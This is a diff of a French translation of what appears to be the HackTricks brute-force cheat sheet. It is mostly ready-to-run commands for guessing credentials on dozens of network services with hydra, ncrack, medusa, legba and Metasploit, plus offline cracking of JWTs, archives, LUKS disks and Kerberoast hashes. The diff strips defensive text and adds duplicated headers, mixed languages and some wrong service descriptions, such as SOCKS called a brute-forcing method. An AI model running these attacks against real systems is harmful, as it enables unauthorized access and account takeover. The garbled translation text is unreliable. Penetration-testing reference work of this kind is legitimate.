@@ -1,10 +1,10 @@
 # Brute Force - Fiche de triche
 
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
-Accédez dès aujourd'hui :
+Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
+Accédez dès aujourd'hui à :
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -56,19 +56,19 @@ crunch 6 8 -t ,@@^^%%
 ```
 ### Cewl
 
-Cewl est un outil qui extrait les mots d'un site Web pour générer une liste de mots potentiels à utiliser dans des attaques de force brute.
+Cewl est un outil de génération de listes de mots basé sur le contenu d'un site Web. Il extrait les mots du site pour créer une liste de mots potentiels à utiliser lors d'une attaque par force brute.
 ```bash
 cewl example.com -m 5 -w words.txt
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Génère des mots de passe basés sur vos connaissances de la victime (noms, dates...)
+Générer des mots de passe basés sur vos connaissances de la victime (noms, dates...)
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-Un outil générateur de listes de mots, qui vous permet de fournir un ensemble de mots, vous donnant la possibilité de créer de multiples variations à partir des mots donnés, créant ainsi une liste de mots unique et idéale à utiliser pour un cible spécifique.
+Un outil générateur de listes de mots, qui vous permet de fournir un ensemble de mots, vous donnant la possibilité de créer de multiples variations à partir des mots donnés, créant ainsi une liste de mots unique et idéale à utiliser pour cibler spécifiquement une cible.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -102,17 +102,17 @@ Finished in 0.920s.
 * [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 * [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
-Accédez dès aujourd'hui :
+Obtenez un accès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ## Services
 
-Classés par ordre alphabétique du nom du service.
+Classés par ordre alphabétique par nom de service.
 
 ### AFP
 ```bash
@@ -126,7 +126,7 @@ msf> run
 ```
 ### AJP
 
-AJP (Apache JServ Protocol) is a binary protocol that can be brute-forced to gain unauthorized access to Apache Tomcat servers.
+AJP (Apache JServ Protocol) is a binary protocol that can be used to proxy requests from a web server to a Java application server. It is often used in combination with the Apache Tomcat server. Attackers can attempt to brute force AJP authentication credentials to gain unauthorized access to the Java application server.
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
@@ -136,7 +136,7 @@ legba amqp --target localhost:5672 --username admin --password data/passwords.tx
 ```
 ### Cassandra
 
-Cassandra is a distributed NoSQL database that can be targeted using brute force attacks. These attacks can be carried out using tools like Hydra or custom scripts to attempt to guess usernames and passwords in order to gain unauthorized access to the database. It is important to secure Cassandra installations with strong authentication mechanisms and regularly update credentials to prevent brute force attacks.
+Cassandra est un système de gestion de base de données distribuée conçu pour gérer de grandes quantités de données réparties sur de nombreux serveurs sans point de défaillance unique.
 ```bash
 nmap --script cassandra-brute -p 9160 <IP>
 # legba ScyllaDB / Apache Casandra
@@ -144,23 +144,7 @@ legba scylla --username cassandra --password wordlists/passwords.txt --target lo
 ```
 ### CouchDB
 
-#### Brute Force
-
-Brute force attacks against CouchDB involve attempting to guess valid credentials by systematically trying all possible combinations of usernames and passwords. This can be done using automated tools that repeatedly make login attempts until the correct credentials are found.
-
-#### Protection
-
-To protect against brute force attacks on CouchDB, consider implementing the following measures:
-
-1. **Strong Credentials**: Enforce the use of strong, complex passwords to make it harder for attackers to guess.
-
-2. **Account Lockout**: Implement account lockout mechanisms that temporarily lock user accounts after a certain number of failed login attempts.
-
-3. **Rate Limiting**: Use rate limiting to restrict the number of login attempts from a single IP address within a specific time frame.
-
-4. **Monitoring**: Regularly monitor login attempts and investigate any unusual patterns or spikes in failed logins.
-
-By implementing these protection measures, you can enhance the security of your CouchDB instance and reduce the risk of unauthorized access through brute force attacks.
+CouchDB est une base de données NoSQL open source développée par l'Apache Software Foundation. Elle stocke les données au format JSON et utilise JavaScript comme langage de requête. CouchDB est souvent utilisée dans les applications web et mobiles pour sa capacité à gérer de grandes quantités de données de manière flexible.
 ```bash
 msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
@@ -170,41 +154,19 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordl
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
 ### Elasticsearch
-
-#### Brute Force
-
-Brute force attacks against Elasticsearch typically involve attempting to guess the credentials of the Elasticsearch instance by trying many different username and password combinations. This can be done using automated tools that systematically try all possible combinations until the correct one is found. 
-
-To protect against brute force attacks, it is recommended to:
-- Use strong and unique passwords for all Elasticsearch instances.
-- Implement account lockout policies to lock out users after a certain number of failed login attempts.
-- Monitor Elasticsearch logs for any suspicious login activity.
-- Consider using multi-factor authentication for an added layer of security.
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
 ```
 ### FTP
 
-#### Brute Force
-
-Brute force attacks against FTP servers involve trying to log in using a massive number of username and password combinations until a valid one is found. This is typically achieved using automated tools that can rapidly test different credentials. 
-
-#### Protection
-
-To protect against brute force attacks on FTP servers, you can implement the following measures:
-
-- **Strong Passwords**: Enforce the use of strong, complex passwords that are difficult to guess.
-- **Account Lockout Policy**: Implement an account lockout policy that locks out an account after a certain number of failed login attempts.
-- **IP Whitelisting**: Allow only specific IP addresses to connect to the FTP server, reducing the attack surface.
-- **Monitoring**: Regularly monitor FTP server logs for any suspicious login activities.
-- **Two-Factor Authentication**: Implement two-factor authentication to add an extra layer of security to the login process.
+Le protocole FTP (File Transfer Protocol) est couramment attaqué à l'aide de l'attaque par force brute.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ftp
 ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
-### Brute HTTP Générique
+### Brute Force Générique HTTP
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
@@ -220,31 +182,7 @@ legba http.basic --username admin --password wordlists/passwords.txt --target ht
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-### HTTP - Post Form
-
----
-
-#### Brute Force
-
-Brute force attacks consist of systematically checking all possible keys or passwords until the correct one is found. This method is often used in combination with automated tools to speed up the process. Brute force attacks can be effective against weak passwords or encryption keys.
-
-#### Dictionary Attack
-
-A dictionary attack involves using a predefined list of words or phrases to attempt to guess the password. This method is more efficient than brute force as it focuses on commonly used passwords or phrases. Dictionary attacks can be successful if the target is using a common or easily guessable password.
-
-#### Rainbow Table Attack
-
-Rainbow table attacks are a type of precomputed brute force attack that uses a large list of precomputed hashes to crack passwords. This method is effective against hashed passwords, as it allows attackers to quickly look up the corresponding plaintext password in the rainbow table.
-
-#### Credential Stuffing
-
-Credential stuffing is a type of brute force attack that involves using automated tools to try large numbers of username and password combinations obtained from data breaches. Attackers use these credentials to gain unauthorized access to user accounts on various platforms.
-
-#### Hydra
-
-Hydra is a popular password-cracking tool that supports multiple protocols, including HTTP, HTTPS, FTP, SMB, and more. It can perform brute force and dictionary attacks to crack passwords and gain unauthorized access to systems.
-
----
+### HTTP - Poster un formulaire
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
@@ -258,7 +196,7 @@ cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 ```
 ### IMAP
 
-IMAP (Internet Message Access Protocol) is a widely used protocol for email retrieval. It is commonly targeted in brute-force attacks to gain unauthorized access to email accounts. Attackers use automated tools to systematically try different username and password combinations until they find the correct one. This is why it is crucial to use strong, unique passwords and enable multi-factor authentication to protect against brute-force attacks.
+IMAP (Internet Message Access Protocol) is a widely used protocol for email retrieval. It is commonly targeted in brute-force attacks to gain unauthorized access to email accounts.
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
@@ -267,25 +205,17 @@ legba imap --username user --password data/passwords.txt --target localhost:993
 ```
 ### IRC
 
-#### Brute Force
-
-Brute force attacks on IRC are typically used to guess the passwords of user accounts. These attacks involve trying all possible combinations of characters until the correct password is found. Brute force attacks can be time-consuming but are often successful if the password is weak.
-
-#### Protection
-
-To protect against brute force attacks on IRC, users should choose strong and unique passwords that are not easily guessable. Additionally, enabling account lockout policies after a certain number of failed login attempts can help prevent brute force attacks.
+L'IRC (Internet Relay Chat) est un protocole de communication en temps réel largement utilisé pour la messagerie instantanée et le partage de fichiers. Il est souvent utilisé par les hackers pour échanger des informations, discuter de sujets techniques et collaborer sur des projets.
 ```bash
 nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
 ```
-### ISCSI
-
 ### ISCSI
 ```bash
 nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
 ```
 ### JWT
 
-### JWT
+Les attaques par force brute contre les JWT sont courantes lorsqu'une application ne met pas en œuvre de mesures de sécurité adéquates. Les attaquants peuvent essayer de deviner les clés secrètes ou de déchiffrer les JWT en utilisant des dictionnaires de mots de passe ou des attaques par force brute. Il est essentiel de choisir des clés JWT suffisamment longues et complexes pour rendre ces attaques inefficaces.
 ```bash
 #hashcat
 hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
@@ -309,15 +239,13 @@ python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1w
 jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
 ```
 ### LDAP
-
-LDAP (Lightweight Directory Access Protocol) is a protocol used for accessing and maintaining directory services over a network. It is commonly used for authentication and storing information about users, groups, and devices in a centralized directory. LDAP servers are often targeted for brute force attacks to gain unauthorized access to sensitive information.
 ```bash
 nmap --script ldap-brute -p 389 <IP>
 legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
 ```
 ### MQTT
 
-MQTT (Message Queuing Telemetry Transport) is a lightweight messaging protocol that is widely used in IoT (Internet of Things) applications. It is designed for connections with remote locations where a "small code footprint" is required or the network bandwidth is limited. MQTT operates on top of the TCP/IP protocol, making it suitable for communication over the internet.
+MQTT (Message Queuing Telemetry Transport) est un protocole de messagerie léger conçu pour les appareils à faible bande passante et à haute latence.
 ```
 ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
 legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
@@ -330,17 +258,11 @@ legba mongodb --target localhost:27017 --username root --password data/passwords
 ```
 ### MSSQL
 
-#### Brute Force
-
-Brute force attacks against MSSQL servers can be carried out using tools like **Hydra** or **Ncrack**. These tools allow you to systematically try all possible combinations of usernames and passwords until the correct one is found. It is important to note that brute force attacks can be time-consuming and may trigger account lockouts if too many incorrect attempts are made. It is recommended to use strong and complex passwords to mitigate the risk of a successful brute force attack.
+La technique de force brute peut être utilisée pour deviner les mots de passe des comptes MSSQL.
 ```bash
 legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
 ```
 ### MySQL
-
-#### Brute Force
-
-Brute force attacks are a common method used to gain unauthorized access to MySQL databases. Attackers use automated tools to try all possible combinations of usernames and passwords until they find the correct one. This method can be effective if weak credentials are used. To protect against brute force attacks, it is recommended to use strong, complex passwords, limit login attempts, and implement multi-factor authentication.
 ```bash
 # hydra
 hydra -L usernames.txt -P pass.txt <IP> mysql
@@ -356,19 +278,7 @@ legba mysql --username root --password wordlists/passwords.txt --target localhos
 ```
 ### OracleSQL
 
-#### Brute Force
-
-Brute force attacks consist of systematically checking all possible keys or passwords until the correct one is found. This method is often used when there is no other way to obtain the required information. In the case of OracleSQL, brute force attacks can be used to crack passwords or gain unauthorized access to databases.
-
-#### Protection
-
-To protect against brute force attacks in OracleSQL, it is recommended to:
-- Implement strong password policies
-- Enforce account lockout after a certain number of failed login attempts
-- Monitor and log login attempts for suspicious activity
-- Use multi-factor authentication for an added layer of security
-
-By following these protection measures, you can significantly reduce the risk of falling victim to brute force attacks in OracleSQL.
+### OracleSQL
 ```bash
 patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017
 
@@ -392,29 +302,17 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-Pour utiliser **oracle\_login** avec **patator**, vous devez **installer**:
+Pour utiliser **oracle\_login** avec **patator**, vous devez **installer** :
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[Bruteforce de hachage OracleSQL hors ligne](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** et **11.2.0.3**) :
+[Bruteforce de hachage OracleSQL hors ligne](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** et **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
 ### POP
 
----
-
-#### Brute Force
-
-Brute force attacks are a common method used to gain unauthorized access to accounts. This technique involves trying all possible combinations of usernames and passwords until the correct one is found. Brute force attacks can be time-consuming but are often successful if the passwords are weak or easily guessable.
-
-#### Protection
-
-To protect against brute force attacks, it is essential to use strong, unique passwords for each account. Additionally, implementing account lockout policies can help prevent attackers from making multiple login attempts. Using multi-factor authentication can also add an extra layer of security to accounts and make them less vulnerable to brute force attacks.
-
-#### Tools
-
-There are various tools available that can automate the brute force process, such as Hydra, Medusa, and Ncrack. These tools can help attackers quickly test a large number of passwords and usernames to find the correct combination and gain unauthorized access to accounts.
+POP (Post Office Protocol) is a standard email protocol used to retrieve emails from a remote server to a local email client. It operates over port 110. POP works by connecting to the email server and authenticating with a username and password. Once authenticated, the emails are downloaded to the local device.
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
@@ -426,10 +324,6 @@ legba pop3 --username admin@example.com --password wordlists/passwords.txt --tar
 legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
 ```
 ### PostgreSQL
-
-#### Brute Force
-
-Brute force attacks against PostgreSQL databases involve trying all possible combinations of usernames and passwords until the correct one is found. This can be done using automated tools like Hydra or Medusa. It is important to use strong and complex passwords to prevent successful brute force attacks. Additionally, implementing account lockout policies can help mitigate the risk of unauthorized access.
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
 medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
@@ -447,16 +341,12 @@ sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
 ```
 ### RDP
-
-Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. RDP is commonly used for remote administration and accessing virtual desktops.
 ```bash
 ncrack -vv --user <User> -P pwds.txt rdp://<IP>
 hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
 legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
 ```
 ### Redis
-
-Redis (Remote Dictionary Server) est un système de stockage de données en mémoire open source, utilisé comme base de données, cache et courtier de messages. Il prend en charge diverses structures de données telles que les chaînes, les hachages, les listes, les ensembles, les ensembles triés, les bitmaps, les hyperloglogs et les index géospatiaux avec des requêtes de rayon. Redis prend également en charge la réplication, la persistance des données, les sauvegardes, la haute disponibilité et bien plus encore.
 ```bash
 msf> use auxiliary/scanner/redis/redis_login
 nmap --script redis-brute -p 6379 <IP>
@@ -465,43 +355,17 @@ legba redis --target localhost:6379 --username admin --password data/passwords.t
 ```
 ### Rexec
 
-### Rexec
-
-Rexec is a simple service that allows users to execute commands on a remote system. It is often used by administrators to manage servers and network devices. Attackers can abuse Rexec by attempting to brute force login credentials to gain unauthorized access to the remote system.
+Rexec is a simple service that allows users to execute commands on a remote system. It is often used during penetration testing to brute force credentials or execute commands on a compromised system.
 ```bash
 hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
 ```
 ### Rlogin
 
-Rlogin est un protocole de connexion distant qui peut être attaqué en utilisant des attaques de force brute pour deviner les mots de passe.
+Rlogin est un protocole de connexion à distance non sécurisé qui peut être sujet à des attaques de force brute.
 ```bash
 hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```
 ### Rsh
-
----
-
-#### Brute Force
-
-Brute force attacks consist of systematically checking all possible keys or passwords until the correct one is found. This method is usually very time-consuming and resource-intensive, but it can be effective against weak passwords.
-
-##### Tools
-
-- Hydra
-- Medusa
-- Ncrack
-
-##### Techniques
-
-- Dictionary Attack
-- Hybrid Attack
-- Rainbow Table Attack
-
-##### Prevention
-
-- Use complex and unique passwords
-- Implement account lockout policies
-- Use multi-factor authentication
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
 ```
@@ -513,20 +377,16 @@ nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/va
 ```
 ### RTSP
 
-Le protocole de streaming en temps réel (RTSP) est un protocole de contrôle utilisé dans les systèmes de communication et de divertissement pour le contrôle de la diffusion en continu de médias.
+Le protocole de streaming en temps réel (RTSP) est un protocole de contrôle utilisé dans les systèmes de communication et de divertissement pour le contrôle de la diffusion en continu de données multimédias sur des réseaux IP.
 ```bash
 hydra -l root -P passwords.txt <IP> rtsp
 ```
 ### SFTP
-
-SFTP (Secure File Transfer Protocol) is a secure way to transfer files between machines over a network. It provides encryption for both authentication credentials and data transferred between the client and server.
 ```bash
 legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
 # Try keys from a folder
 legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-### SNMP
-
 ### SNMP
 ```bash
 msf> use auxiliary/scanner/snmp/snmp_login
@@ -536,9 +396,7 @@ hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt ta
 ```
 ### SMB
 
-### SMB
-
-SMB (Server Message Block) is a protocol for sharing resources, such as files and printers, over a network. It is widely used in Windows networks. Brute forcing SMB involves trying different username and password combinations to gain unauthorized access to an SMB server. This can be done using tools like Hydra or Metasploit. It is important to note that brute forcing is illegal and unethical unless you have explicit permission to do so as part of a penetration test.
+Le protocole SMB (Server Message Block) est un protocole de partage de fichiers largement utilisé dans les environnements Windows.
 ```bash
 nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
@@ -546,7 +404,7 @@ legba smb --target share.company.com --username admin --password data/passwords.
 ```
 ### SMTP
 
-SMTP (Simple Mail Transfer Protocol) is a communication protocol for email transmission. It is widely used for sending emails over the Internet.
+Le protocole de transfert de courrier simple (SMTP) est un protocole de communication utilisé pour envoyer des e-mails à travers un réseau.
 ```bash
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
 hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
@@ -554,7 +412,7 @@ legba smtp --username admin@example.com --password wordlists/passwords.txt --tar
 ```
 ### SOCKS
 
-### CHAUSSETTES
+SOCKS (Socket Secure) is a protocol that routes network packets between a client and server through a proxy server. It can be used as a method for brute-forcing login credentials by attempting different username and password combinations until the correct one is found.
 ```bash
 nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
 legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
@@ -563,9 +421,7 @@ legba socks5 --target localhost:1080 --username admin --password data/passwords.
 ```
 ### SQL Server
 
-#### Brute Force
-
-Brute force attacks against SQL Server involve trying all possible combinations of usernames and passwords until a successful login is found. This method can be time-consuming but is effective if the credentials are weak. Tools like Hydra and Medusa can be used to automate the brute force process. It is important to note that brute force attacks can be detected and prevented by implementing account lockout policies and using strong, complex passwords.
+### Serveur SQL
 ```bash
 #Use the NetBIOS name of the machine as domain
 crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
@@ -576,9 +432,7 @@ msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts
 ```
 ### SSH
 
-#### Brute Force
-
-Brute force attacks are a common method used to gain unauthorized access to SSH servers. Attackers use automated tools to try all possible combinations of usernames and passwords until the correct one is found. This method is time-consuming but can be effective if the credentials are weak. To protect against brute force attacks, it is recommended to use strong, complex passwords, implement account lockout policies, and use tools like fail2ban to block repeated login attempts from the same IP address.
+### SSH
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ssh
 ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
@@ -590,7 +444,7 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 ```
 #### Clés SSH faibles / PRNG prévisible de Debian
 
-Certains systèmes présentent des failles connues dans la graine aléatoire utilisée pour générer du matériel cryptographique. Cela peut entraîner une réduction drastique de l'espace des clés qui peut être brute-forcé avec des outils tels que [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Des ensembles de clés faibles pré-générées sont également disponibles, comme [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Certains systèmes présentent des failles connues dans la graine aléatoire utilisée pour générer du matériel cryptographique. Cela peut entraîner une réduction drastique de l'espace des clés qui peut être soumis à une attaque par force brute avec des outils tels que [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Des ensembles de clés faibles pré-générées sont également disponibles, tels que [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ et OpenMQ)
 
@@ -600,7 +454,7 @@ legba stomp --target localhost:61613 --username admin --password data/passwords.
 ```
 ### Telnet
 
-Telnet est un protocole de communication utilisé pour se connecter à des appareils distants. Il est souvent utilisé pour l'administration à distance des appareils réseau. Les attaquants peuvent utiliser des attaques de force brute pour deviner les identifiants de connexion Telnet et accéder illégalement à des appareils distants.
+Telnet est un protocole de communication utilisé sur les réseaux informatiques pour permettre une connexion à distance à un hôte. Il est souvent utilisé pour l'administration à distance des serveurs et des périphériques réseau.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> telnet
 ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
@@ -617,7 +471,7 @@ legba telnet \
 ```
 ### VNC
 
-### VNC
+La méthode de force brute peut être utilisée pour deviner les mots de passe VNC. Il existe des outils comme Hydra et Medusa qui peuvent être utilisés pour automatiser ce processus.
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
 medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
@@ -633,12 +487,10 @@ set RHOSTS <ip>
 set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```
 ### Winrm
-
-Winrm (Windows Remote Management) est un protocole de gestion à distance utilisé pour l'administration des systèmes Windows. Il est possible d'effectuer une attaque de force brute contre Winrm en essayant de deviner les identifiants d'authentification.
 ```bash
 crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
@@ -662,7 +514,7 @@ Accédez dès aujourd'hui :
 * [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 * [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Consultez ceci avant d'essayer de faire une attaque par force brute sur un Hash.
+Consultez ceci avant d'essayer de forcer un Hash.
 
 ### ZIP
 ```bash
@@ -712,11 +564,19 @@ apt-get install libcompress-raw-lzma-perl
 
 #### Brute Force
 
-Brute force attacks consist of systematically checking all possible keys or passwords until the correct one is found. This method is time-consuming but effective, especially against weak passwords. Tools like Hydra and Medusa can automate the process.
+Brute force attacks consist of systematically checking all possible keys or passwords until the correct one is found. This method is usually very time-consuming and resource-intensive, but it can be effective against weak passwords. There are different tools available to automate the process of brute force attacks, such as Hydra, Medusa, and John the Ripper.
 
-#### Protection
+#### Dictionary Attacks
 
-To protect against brute force attacks, implement measures such as account lockouts after a certain number of failed attempts, CAPTCHA challenges, and enforcing strong password policies. Additionally, consider implementing multi-factor authentication for an extra layer of security.
+Dictionary attacks involve using a predefined list of words as potential passwords. These lists can be custom-made or obtained from various sources. Dictionary attacks are usually faster than brute force attacks because they do not have to generate every possible combination of characters.
+
+#### Rainbow Tables
+
+Rainbow tables are precomputed tables used to crack password hashes. They are effective because they allow for the quick lookup of a password given its hash. Rainbow tables are especially useful when dealing with hashed passwords obtained from a data breach.
+
+#### Hybrid Attacks
+
+Hybrid attacks combine elements of both brute force and dictionary attacks. These attacks are more sophisticated and can be tailored to target specific password patterns or structures. By combining different attack methods, hybrid attacks can be more efficient than using brute force or dictionary attacks alone.
 ```bash
 apt-get install pdfcrack
 pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
@@ -757,7 +617,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 ### Keberoasting
 
-Keberoasting est une technique utilisée pour extraire des hachages de mots de passe à partir de services tels que Kerberos en exploitant les faiblesses des hachages de type 5.
+Keberoasting est une technique d'attaque qui cible les services Kerberos pour extraire des tickets de service et les attaquer hors ligne.
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
@@ -767,7 +627,7 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 
 #### Méthode 1
 
-Installer: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
+Installer : [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
 bruteforce-luks -f ./list.txt ./backup.img
 cryptsetup luksOpen backup.img mylucksopen
@@ -783,9 +643,9 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-### Mysql
+### Tutoriel de BF Luks supplémentaire : [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
-Un autre tutoriel Luks BF : [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+### Mysql
 ```bash
 #John hash format
 <USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
@@ -798,7 +658,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 ```
 ### Cisco
 
